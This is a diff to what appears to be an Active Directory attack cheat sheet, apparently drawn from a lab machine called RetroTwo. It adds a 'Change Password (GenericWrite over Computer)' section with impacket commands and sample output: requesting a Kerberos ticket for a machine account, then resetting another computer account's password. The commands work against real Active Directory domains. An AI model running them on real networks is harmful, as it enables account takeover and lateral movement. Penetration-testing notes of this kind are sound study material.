@@ -481,10 +481,55 @@ MemberSID               : S-1-5-21-2291914956-3290296217-2402366952-1114
 
 ---
 
-### Abuse #5 : RBCD Attack (GenericWrite over DC)
+### Abuse #5 : Change Password (GenericWrite over Computer)
 
 {{< tab set6 tab1 >}}Linux{{< /tab >}}
 {{< tabcontent set6 tab1 >}}
+
+#### 1. Request a TGT
+
+```console
+sudo ntpdate -s <DC_IP> && impacket-getTGT '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
+```
+
+```console {class="sample-code"}
+$ sudo ntpdate -s 10.129.253.91 && impacket-getTGT 'retro2.vl/FS01$:fs01' -dc-ip 10.129.253.91                                    
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in FS01$.ccache
+```
+
+```console
+export KRB5CCNAME='<USER>.ccache'
+```
+
+```console {class="sample-code"}
+┌──(kali㉿kali)-[~/Desktop/RetroTwo]
+└─$ export KRB5CCNAME='FS01$.ccache'
+```
+
+#### 2. Change Target Machine Password
+
+```console
+impacket-addcomputer '<DOMAIN>/<USER>' -k -no-pass -dc-host '<DC>' -dc-ip <DC_IP> -computer-name '<TARGET_COMPUTER>' -computer-pass '<NEW_PASSWORD>' -no-add
+```
+
+```console {class="sample-code"}
+┌──(kali㉿kali)-[~/Desktop/RetroTwo]
+└─$ impacket-addcomputer 'retro2.vl/FS01$' -k -no-pass -dc-host 'BLN01.retro2.vl' -dc-ip 10.129.253.91 -computer-name 'ADMWS01$' -computer-pass 'Test1234' -no-add
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Successfully set password of ADMWS01$ to Test1234.
+```
+
+{{< /tabcontent >}}
+
+---
+
+### Abuse #6 : RBCD Attack (GenericWrite over DC)
+
+{{< tab set7 tab1 >}}Linux{{< /tab >}}
+{{< tabcontent set7 tab1 >}}
 
 #### 1. RBCD Attack
 
